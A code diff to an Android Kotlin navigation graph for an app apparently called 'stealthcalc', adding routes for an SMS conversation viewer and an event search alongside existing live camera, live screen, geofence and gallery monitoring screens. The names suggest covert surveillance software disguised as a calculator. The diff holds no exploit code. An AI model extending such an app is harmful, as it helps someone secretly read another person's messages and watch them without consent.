@@ -39,8 +39,10 @@ import com.stealthcalc.browser.ui.LinkVaultScreen
 import com.stealthcalc.monitoring.ui.AgentConfigScreen
 import com.stealthcalc.monitoring.ui.AnalyticsScreen
 import com.stealthcalc.monitoring.ui.DashboardScreen
+import com.stealthcalc.monitoring.ui.EventSearchScreen
 import com.stealthcalc.monitoring.ui.GalleryScreen
 import com.stealthcalc.monitoring.ui.GeofenceConfigScreen
+import com.stealthcalc.monitoring.ui.SmsConversationScreen
 import com.stealthcalc.monitoring.ui.LiveCameraScreen
 import com.stealthcalc.monitoring.ui.LiveScreenScreen
 import com.stealthcalc.recorder.ui.RecorderScreen
@@ -87,6 +89,8 @@ sealed class AppScreen(val route: String) {
     data object LiveCamera : AppScreen("live_camera")
     data object GeofenceConfig : AppScreen("geofence_config")
     data object Analytics : AppScreen("analytics")
+    data object SmsConversations : AppScreen("sms_conversations")
+    data object EventSearch : AppScreen("event_search")
 }
 
 private const val VAULT_GRAPH_ROUTE = "vault_graph"
@@ -414,6 +418,8 @@ fun StealthNavGraph(
                 onNavigateToLiveScreen = { navController.navigate(AppScreen.LiveScreen.route) },
                 onNavigateToLiveCamera = { navController.navigate(AppScreen.LiveCamera.route) },
                 onNavigateToAnalytics = { navController.navigate(AppScreen.Analytics.route) },
+                onNavigateToSmsConversations = { navController.navigate(AppScreen.SmsConversations.route) },
+                onNavigateToSearch = { navController.navigate(AppScreen.EventSearch.route) },
             )
         }
 
@@ -442,6 +448,14 @@ fun StealthNavGraph(
 
         composable(AppScreen.Analytics.route) {
             AnalyticsScreen(onBack = { navController.popBackStack() })
+        }
+
+        composable(AppScreen.SmsConversations.route) {
+            SmsConversationScreen(onBack = { navController.popBackStack() })
+        }
+
+        composable(AppScreen.EventSearch.route) {
+            EventSearchScreen(onBack = { navController.popBackStack() })
         }
     }
 }
